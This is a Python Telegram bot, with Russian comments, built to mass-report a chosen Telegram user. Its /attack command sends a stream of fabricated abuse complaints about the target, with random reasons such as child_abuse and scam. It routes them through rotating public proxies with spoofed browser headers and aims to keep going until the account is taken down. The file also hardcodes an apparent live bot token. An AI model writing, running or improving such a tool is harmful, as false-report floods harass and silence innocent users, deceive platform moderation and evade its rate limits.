import telebot
import requests
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

# ТВОЙ ТОКЕН (уже вставил)
TOKEN = "8304283330:AAEs_c8xMUK_OfBvqeNZNx5_Btf8EgPqgbc"
bot = telebot.TeleBot(TOKEN)

class ReportBot:
    def __init__(self):
        self.proxy_list = []
        self.active_targets = {}
        self.report_queue = Queue()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        ]
        self.report_reasons = [
            "spam", "violence", "pornography", "child_abuse", 
            "illegal_goods", "personal_data", "scam", "impersonation"
        ]
        self.load_proxies()
        
    def load_proxies(self):
        # Загружаем прокси с публичных источников
        try:
            response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
            self.proxy_list = [{"http": f"http://{p}", "https": f"http://{p}"} for p in response.text.strip().split('\r\n')]
        except:
            self.proxy_list = [{"http": "http://8.219.136.165:80", "https": "http://8.219.136.165:80"}]  # Запасные
    
    def send_report(self, username, proxy):
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        
        # Формируем жалобу через поддержку
        data = {
            "message": f"Report user @{username} for {random.choice(self.report_reasons)}",
            "username": username,
            "reason": random.choice(self.report_reasons),
            "protocol": "telegram"
        }
        
        try:
            # Пробуем разные эндпоинты
            endpoints = [
                "https://telegram.org/support",
                "https://telegram.org/faq/report",
                "https://t.me/support"
            ]
            
            for endpoint in endpoints:
                response = requests.post(
                    endpoint,
                    data=data,
                    headers=headers,
                    proxies=proxy,
                    timeout=5
                )
                if response.status_code in [200, 302, 429]:
                    return True
        except:
            pass
        return False
    
    def attack_loop(self, username, chat_id):
        total_reports = 0
        while self.active_targets.get(username, False):
            try:
                # 10 жалоб за 5 секунд
                with ThreadPoolExecutor(max_workers=10) as executor:
                    futures = []
                    for _ in range(10):
                        if self.proxy_list:
                            proxy = random.choice(self.proxy_list)
                            futures.append(executor.submit(self.send_report, username, proxy))
                        time.sleep(0.5)  # Задержка между жалобами в потоке
                    
                    successful = sum(1 for f in futures if f.result())
                    total_reports += successful
                    
                    bot.send_message(
                        chat_id, 
                        f"⚡ Отправлено {successful} жалоб на @{username}\n"
                        f"📊 Всего: {total_reports}\n"
                        f"🎯 Статус: атака продолжается..."
                    )
                
                time.sleep(1)  # Пауза между пакетами
                
            except Exception as e:
                bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:50]}")
                continue
        
        bot.send_message(chat_id, f"✅ Атака на @{username} остановлена! Всего жалоб: {total_reports}")
    
    def start_attack(self, username, chat_id):
        if username in self.active_targets and self.active_targets[username]:
            return "⚠️ Атака уже запущена!"
        
        self.active_targets[username] = True
        thread = threading.Thread(target=self.attack_loop, args=(username, chat_id))
        thread.daemon = True
        thread.start()
        return f"🔥 Запустил атаку на @{username}\n📌 Жалобы: 10/5сек\n🔄 Буду долбить пока не ляжет!"
    
    def stop_attack(self, username):
        if username in self.active_targets:
            self.active_targets[username] = False
            return f"🛑 Остановил атаку на @{username}"
        return "❌ Атака не найдена"

reporter = ReportBot()

@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message, 
        "🤖 Telegram Report Bot v2.0\n\n"
        "Команды:\n"
        "/attack @username - начать атаку\n"
        "/stop @username - остановить\n"
        "/status - статистика\n"
        "/proxies - кол-во прокси\n\n"
        "⚡ 10 жалоб в 5 секунд"
    )

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    try:
        username = message.text.split()[1].replace('@', '')
        response = reporter.start_attack(username, message.chat.id)
        bot.reply_to(message, response)
    except:
        bot.reply_to(message, "❌ Формат: /attack @username")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    try:
        username = message.text.split()[1].replace('@', '')
        response = reporter.stop_attack(username)
        bot.reply_to(message, response)
    except:
        bot.reply_to(message, "❌ Формат: /stop @username")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    active = [f"@{u}" for u, active in reporter.active_targets.items() if active]
    if active:
        bot.reply_to(message, f"🎯 Активные цели: {', '.join(active)}")
    else:
        bot.reply_to(message, "😴 Нет активных атак")

@bot.message_handler(commands=['proxies'])
def proxies_cmd(message):
    bot.reply_to(message, f"🔌 Прокси загружено: {len(reporter.proxy_list)}")

# Запускаем бота
if __name__ == "__main__":
    print("🤖 Бот запущен и готов к атакам!")
    bot.infinity_polling()
